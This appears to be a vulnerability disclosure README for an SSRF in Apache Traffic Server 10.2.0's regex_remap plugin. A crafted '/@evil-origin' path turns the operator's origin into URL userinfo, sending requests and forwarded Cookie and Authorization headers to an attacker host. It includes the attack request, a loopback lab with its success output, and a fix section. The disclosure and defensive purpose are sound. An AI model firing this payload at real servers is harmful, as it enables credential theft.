<p align="center">
  <img src="header.png" alt="Abraxas Labs - ats-regex-remap-userinfo" width="100%">
</p>

<p align="center">
  <a href="https://abraxaslabs.tech"><strong>abraxaslabs.tech</strong></a>
  &nbsp;·&nbsp;
  <a href="https://github.com/abraxas">github.com/abraxas</a>
  &nbsp;·&nbsp;
  <a href="https://x.com/abraxas_null">@abraxas_null</a>
  &nbsp;·&nbsp;
  <a href="mailto:abraxas.null@proton.me">abraxas.null@proton.me</a>
  &nbsp;·&nbsp;
  <a href="https://github.com/abraxas/ats-regex-remap-userinfo">ats-regex-remap-userinfo</a>
</p>

# ats-regex-remap-userinfo

**Class:** SSRF
**Reach:** Remote

**Apache Traffic Server** `10.2.0` (`b1df7334`) - Apache Software Foundation

`regex_remap` `$n` substitution is concatenated into a string and fed to `TSUrlParse`, which `url_clear`s then parses as a full URL. A capture that begins with `@` is RFC 3986 userinfo, so the operator origin becomes userinfo and the attacker host becomes the origin. Cookie and Authorization are forwarded as the ATS uid.

The leftover is `http://origin:port$1` (no slash). Documented `http://origin/$1` stays on the operator origin because the slash ends authority. Plugin not loaded by default.

This is not CVE-2026-58179 (url_len VLA, now `LocalBuffer`) and not CVE-2026-22068 (core `regex_map` is full-anchored).

| | |
|---|---|
| ID | no CVE yet |
| Class | **SSRF** |
| Reach | **Remote** (unauthenticated HTTP) |
| CWE | [CWE-918](https://cwe.mitre.org/data/definitions/918.html) |
| CVSS | **High: 8.6** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` |
| Product | [Apache Traffic Server](https://github.com/apache/trafficserver) |
| Affected | **10.2.0** (`b1df7334b39a878971c376da849e8da4984918b6`) `regex_remap.so` noslash `$n` |
| Auth | none. Plugin loaded. Subst `http://origin:port$1`. |
| License | [GNU Affero GPL v3.0](LICENSE) |
| Lab | `127.0.0.1:18730` only. Image `ats-10.2.0-lab:local`. |

I pinned tag [10.2.0](https://github.com/apache/trafficserver/releases/tag/10.2.0), commit [`b1df7334b39a878971c376da849e8da4984918b6`](https://github.com/apache/trafficserver/commit/b1df7334b39a878971c376da849e8da4984918b6). Source-built image.

## What an attacker can do

Unauth HTTP to a vhost whose remap loads `regex_remap.so` with `$n` immediately after host:port, no slash.

| Method | Sink | Privilege |
|---|---|---|
| GET `/@evil-origin:8080/x` with subst `http://good-origin:8080$1` | `TSUrlParse` after `url_clear` ([`regex_remap.cc:1159-1168`](https://github.com/apache/trafficserver/blob/b1df7334b39a878971c376da849e8da4984918b6/plugins/regex_remap/regex_remap.cc#L1159-L1168), [`URL.cc:1313-1327`](https://github.com/apache/trafficserver/blob/b1df7334b39a878971c376da849e8da4984918b6/src/proxy/hdrs/URL.cc#L1313-L1327)) | **Integrity / SSRF (lab-proven):** ATS dials `evil-origin:8080` as origin (userinfo=`good-origin:8080`). Cookie and Authorization forwarded. |
| Same | attacker-origin body | **Recon (lab-proven):** `ATS-REGEX-REMAP-USERINFO-WITNESS` returned to the client. `cookie-fwd=True` `authorization-fwd=True`. |
| Documented subst `http://good-origin:8080/$1` | authority ends at `/` | **Closed (lab-proven):** stayed on good-origin. |
| Subst `http://$1` | operator put `$n` in authority | **SSRF (lab-proven):** also reached evil-origin. Different operator mistake. |

**Lab-proven vs inferred:** noslash leftover, documented slash stays, dollar-at / dollar-host also evil, Cookie and Authorization forwarded, control `/ok` on good-origin: lab. What the attacker-origin can do with those headers is whatever that host already is.

**Requires:** `regex_remap` plugin. Map with subst `http://origin:port$1` (no slash). `remap_required` stayed 1 (not an open relay).

## Adjacent surface that stays closed

| Surface | Lab |
|---|---|
| Documented `http://origin/$1` | `slash=good` |
| Core `regex_map` host | `RE_ANCHORED\|RE_ENDANCHORED` (CVE-2026-22068 closed) |
| url_len stack | `LocalBuffer` (CVE-2026-58179 closed) |
| `remap_required: 0` open relay | not used |
| CONTROL GET `/ok` | good-origin, no witness |

## How I found it

`regex_remap` builds a dest string from `$n` and calls `TSUrlParse` on the whole thing. `URL.cc` `@` is userinfo. Concatenate `http://good-origin:8080` + `@evil-origin:8080/x` and the parser does exactly what RFC 3986 says.

I tried the documented shape first. `http://good-origin:8080/$1` with path `/@evil-origin:8080/x` becomes `http://good-origin:8080/@evil-origin:8080/x`. Slash ends authority. Stayed on good-origin. That is not the leftover.

Then `http://good-origin:8080$1` (no slash). Dest `http://good-origin:8080@evil-origin:8080/x`. userinfo=`good-origin:8080` host=`evil-origin`. Witness on the evil origin. Cookie and Authorization came along.

Wrong turns: filing the documented slash shape; treating core regex_map as this plugin; inflating url_len VLA (patched); treating `http://$1` as the only leftover (it is a second operator mistake, not the noslash one).

Theatre: a reverse shell. The oracle is an origin body plus forwarded Cookie / Authorization.

## Lab

```bash
python3 ats-regex-remap-userinfo-Abraxas-Labs.py
```

or

```bash
cd lab
./run.sh
```

Loopback `127.0.0.1:18730` (evil origin also published on `18731`). Compose project `ats-regex-remap-userinfo`. Image `ats-10.2.0-lab:local`. Three vhosts: slash / noslash / dollar. Witness `ATS-REGEX-REMAP-USERINFO-WITNESS`. Last line:

```
SUCCESS ats-regex-remap-userinfo shape=noslash leftover=noslash http://good-origin:8080$1 (userinfo=good-origin:8080 host=evil-origin) slash=good noslash=evil dollar-at=evil dollar-host=evil cookie-fwd=True authorization-fwd=True control=/ok ATS-REGEX-REMAP-USERINFO-WITNESS
```

## The fix

Do not concatenate `$n` into the authority. Keep a slash between host and capture, or parse the subst as path-only. Reject a dest whose host is not the operator origin. Strip userinfo from plugin-built URLs. Docs should stop implying `http://origin/$1` is the only shape operators write.

## References

- [github.com/apache/trafficserver](https://github.com/apache/trafficserver) tag [10.2.0](https://github.com/apache/trafficserver/releases/tag/10.2.0) (`b1df7334b39a878971c376da849e8da4984918b6`)
- [`regex_remap.cc`](https://github.com/apache/trafficserver/blob/b1df7334b39a878971c376da849e8da4984918b6/plugins/regex_remap/regex_remap.cc) `TSUrlParse` after subst
- [`URL.cc`](https://github.com/apache/trafficserver/blob/b1df7334b39a878971c376da849e8da4984918b6/src/proxy/hdrs/URL.cc) `@` userinfo
- [`InkAPI.cc`](https://github.com/apache/trafficserver/blob/b1df7334b39a878971c376da849e8da4984918b6/src/api/InkAPI.cc) `TSUrlParse`
- [CWE-918](https://cwe.mitre.org/data/definitions/918.html)
